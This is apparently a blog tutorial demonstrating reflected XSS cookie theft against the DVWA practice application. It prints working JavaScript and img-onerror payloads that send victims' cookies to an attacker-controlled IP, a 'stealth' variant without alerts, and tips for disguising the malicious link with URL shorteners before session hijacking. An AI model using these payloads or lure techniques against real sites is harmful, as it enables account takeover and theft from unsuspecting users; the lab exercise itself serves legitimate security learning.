---
layout: single
title: Stealing Cookies via XSS
excerpt: "Cross-Site Scripting (XSS) attacks are a type of injection, in which malicious scripts are injected into otherwise benign and trusted websites. XSS attacks occur when an attacker uses a web application to send malicious code, generally in the form of a browser side script, to a different end user."
date: 2023-02-07
classes: wide
header:
  teaser: /assets/images/xss/XSS.jpg
  teaser_home_page: true
  icon: #/assets/images/thm.png
categories:
  - Stole
tags:
  - Web
  - XSS 
---

![](/assets/images/xss/banner.png)

An attacker can use XSS to send a malicious script to an unsuspecting user. The end user’s browser has no way to know that the script should not be trusted, and will execute the script. Because it thinks the script came from a trusted source, the malicious script can access any cookies, session tokens, or other sensitive information retained by the browser and used with that site. These scripts can even rewrite the content of the HTML page.

The malicious content sent to the web browser often takes the form of a segment of JavaScript, but may also include HTML, Flash, or any other type of code that the browser may execute. The variety of attacks based on XSS is almost limitless, but they commonly include transmitting private data, like cookies or other session information, to the attacker, redirecting the victim to web content controlled by the attacker, or performing other malicious operations on the user’s machine under the guise of the vulnerable site.

## Types of XSS attacks

There are different types of XSS attacks, the most popular are:

* Reflected XSS (We will exploit this one today), which is pretty common in old websites.
* Stored XSS, which is the most dangerous one.
* Dom XSS

If you want to expand your knowledge about XSS, I recommend you to visit this [site](https://owasp.org/www-community/attacks/xss/).

## Stealing Cookies via XSS

As you may know, cookies are used in most websites to store information about the user's sessions. If we manage to retrieve a session cookie from another user, we are going to be able to impersonate him, and gain access to his account.

To achieve this, we are going to exploit Reflected XSS, to send to the victim a custom URL with a payload, that when opened by the user, it sends us his session cookie.

For this task I'm going to be using the DVWA machine, which is a Vulnerable Web Application to practice Web Attacks. If you want to replicate this exercise, you can download the ISO file of the machine [here](https://www.vulnhub.com/entry/damn-vulnerable-web-application-dvwa-107,43/).

Creds: `User:admin Password:password`

## Discover XSS

Once we are loged into the DVWA machine, we can navigate to the Reflected XSS menu in the left nav form and start testing our payloads.

Remember to set to low the seccurity level before doing nothing.

![](/assets/images/xss/security.png)

Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request.

In order to test if the website is vulnerable to Reflected XSS we can try some javascript payloads, you can find a lot of XSS payloads on the internet, but I recommend you this [website](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection).

We find the following search box, which greets us by giving as a parameter our user name.

![](/assets/images/xss/hello.png)

Let's try to insert a basic javascript alert script, which will spawn an alert box with the content we sent between the brackets.
Payload: `<script>alert("Slayer!")</script>`

![](/assets/images/xss/vuln.png)

The payload get's executed, so we know that the webpage is vulnerable to reflected XSS, we can also notice that the payload is included in the website URL so we can modify the URL and send a custom crafted one to our victim.

If we insert the script in the URL we get the same result.

![](/assets/images/xss/vuln2.png)

## Exploiting XSS

Now we need to make a payload to retrieve the session cookie, we can use the `document.cookie` sentence with an alert to spawn an alert box with the document cookie.
`<script> alert(document.cookie)</script>`

![](/assets/images/xss/vuln3.png)

And we get the session cookie! Now is the time to make a little more complex script to send the cookies from the victim browser to the attacking machine, so we can receive them when the victim clicks on the malicious link.

For this example we will be using this payload, remember to replace the soruce.IP and PORT with your attacker configuration:

```
<script>
alert(document.cookie);
var i=new Image;
i.src="http://192.168.0.1:80/?"+document.cookie;
</script>
```

This payload will print in an alert box the document cookie, then will ask for the server to load a new image located in the attacker machine with the document cookie name, so the attacker will see a GET request with the document cookie value on his HTTP server.

![](/assets/images/xss/vuln4.png)

After submitting the request, we get the cookies in our attacker HTTP.SERVER.

![](/assets/images/xss/vuln5.png)

# Stealth Payload

The previous script we have used, spawns an alert box in the client's browser, we don't want that to happen, cause the victim will realise that something is going wrong.
We can edit our payload to create a stealthy one, which does not spawn an alert box.

```
<script>var i=new Image;i.src="http://192.168.0.1:80/?"+document.cookie;</script>
```

This script won't print nothing in the victim's browser, and we will get the same result.

We can also use the `<img>` tag instead of the `<script>` Tags:

`<img src=x onerror="this.src='http://192.168.0.21:80/?'+document.cookie; this.removeAttribute('onerror');">`

And obtain the same result.

![](/assets/images/xss/vuln6.png)

## Crafting the malicious URL.

No one will trust a URL like the following one:

`https://facebook.com/?name=%3Cimg+src%3Dx+onerror%3D%22this.src%3D%27http%3A%2F%2F192.168.0.21%3A80%2F%3F%27%2Bdocument.cookie%3B+this.removeAttribute%28%27onerror%27%29%3B%22%3E#` 

But we can use some tricks and services to short our URL so can be more legit to the victim's eyes, in my case I used this [website](https://acortar.link/shorten).

![](/assets/images/xss/url.png)

And as a result I got the following URL, which is way shorter.

![](/assets/images/xss/url2.png)

You can use several of these services to make your url look legit. Now you need to send this URL to the victim and start your HTTP.SERVER.
When the victim clicks on your link, you will get his cookies.

1 . Opening the Link as a victim:

![](/assets/images/xss/url3.png)

2 . We will get the same website as always without any alert:

![](/assets/images/xss/url4.png)

3 . The attacker retrieves the cookies:

![](/assets/images/xss/cookies2.png)

4 . The attacker changes the cookie settings in his browser.

![](/assets/images/xss/cookiesfire.png)

5 . Refresh the website:

![](/assets/images/xss/login.png)

6 . We successfully impersonate the admin session. 

There are other ways of doing this, I recommend you to try this python [script](https://github.com/lnxg33k/misc/blob/master/XSS-cookie-stealer.py) to achieve the same result!.

I hope you have learned how to perform an XSS attack, see you in the next post!.